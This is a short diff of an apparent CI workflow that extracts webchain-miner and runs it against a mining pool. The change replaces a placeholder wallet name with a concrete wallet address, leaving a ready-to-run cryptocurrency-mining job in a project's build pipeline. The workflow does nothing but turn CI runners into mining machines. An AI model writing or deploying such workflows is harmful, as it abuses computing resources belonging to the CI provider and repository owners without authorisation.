@@ -21,6 +21,6 @@ jobs:
     - name: Seting-UP
       run: Expand-Archive webchain-miner-2.8.0-win64.zip
     - name: Running
-      run: .\webchain-miner-2.8.0-win64\webchain-miner.exe -o pool.webchain.network:2222 -p x -t 1 -u MINTME_WALLET
+      run: .\webchain-miner-2.8.0-win64\webchain-miner.exe -o pool.webchain.network:2222 -p x -t 1 -u 0x07e85a170d8e887D59DDA5c821289ad2CaA123b2
     - name: END
       run: exit
